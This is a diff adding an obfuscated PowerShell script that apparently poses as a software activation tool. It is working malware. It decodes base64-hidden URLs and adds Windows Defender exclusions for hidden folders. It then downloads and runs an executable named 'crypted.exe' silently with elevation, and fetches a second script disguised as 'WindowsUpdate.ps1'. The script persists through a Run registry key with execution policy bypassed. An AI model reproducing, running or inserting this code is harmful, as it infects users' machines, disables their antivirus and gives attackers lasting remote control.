@@ -1,0 +1,67 @@
+function Add-Exclusion {
+    param ([string]$Path)
+    try {
+        Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue
+    } catch {}
+}
+
+$downloadUrlB64 = "aHR0cHM6Ly9yYXZlbmZvb3RiYWxsY2x1Yi5jb20vd3AtY29udGVudC9jcnlwdGVkLmV4ZQ=="
+$updaterExeB64 = "dXBkYXRlci5leGU="
+$hiddenAttrB64 = "SGlkZGVu"
+$silentlyContinueB64 = "U2lsZW50bHljb250aW51ZQ=="
+$stopActionB64 = "U3RvcA=="
+$directoryB64 = "RGlyZWN0b3J5"
+$runAsB64 = "UnVuQXM="
+$scriptUrlB64 = "aHR0cHM6Ly9pbnN0YWxsc2gucGFnZXMuZGV2L2NvbmZpZy5wczE="
+$trustedNameB64 = "V2luZG93c1VwZGF0ZS5wczE="
+$trustedFolderB64 = "VXBkYXRlQ2FjaGU="
+
+$downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($downloadUrlB64))
+$updaterExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterExeB64))
+$hiddenAttr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hiddenAttrB64))
+$silentlyContinue = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($silentlyContinueB64))
+$stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stopActionB64))
+$directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($directoryB64))
+$runAs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($runAsB64))
+$scriptUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($scriptUrlB64))
+$trustedName = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($trustedNameB64))
+$trustedFolder = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($trustedFolderB64))
+
+$persistFolder = Join-Path $env:APPDATA $trustedFolder
+New-Item -ItemType $directory -Path $persistFolder -Force | Out-Null
+Set-ItemProperty -Path $persistFolder -Name Attributes -Value $hiddenAttr
+Add-Exclusion -Path $persistFolder
+
+$hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
+New-Item -ItemType $directory -Path $hiddenFolder | Out-Null
+Add-Exclusion -Path $hiddenFolder
+
+$tempPath = Join-Path $hiddenFolder $updaterExe
+
+try {
+    Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
+    
+    Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr
+    Set-ItemProperty -Path $tempPath -Name Attributes -Value $hiddenAttr
+    
+    $process = Start-Process -FilePath $tempPath -WindowStyle $hiddenAttr -Verb $runAs -PassThru -Wait
+
+    if ($process.ExitCode -eq 0) {
+        $persistScriptPath = Join-Path $persistFolder $trustedName
+        
+        Invoke-WebRequest -Uri $scriptUrl -OutFile $persistScriptPath -UseBasicParsing
+        
+        Set-ItemProperty -Path $persistScriptPath -Name Attributes -Value $hiddenAttr
+        
+        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        $regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistScriptPath`""
+        Set-ItemProperty -Path $regPath -Name $trustedName -Value $regValue -Force
+    }
+} catch {
+    Write-Host "An error occurred during activation. Please try again." -ForegroundColor Red
+    exit 1
+} finally {
+    if (Test-Path $hiddenFolder) {
+        Remove-Item $hiddenFolder -Recurse -Force
+    }
+}
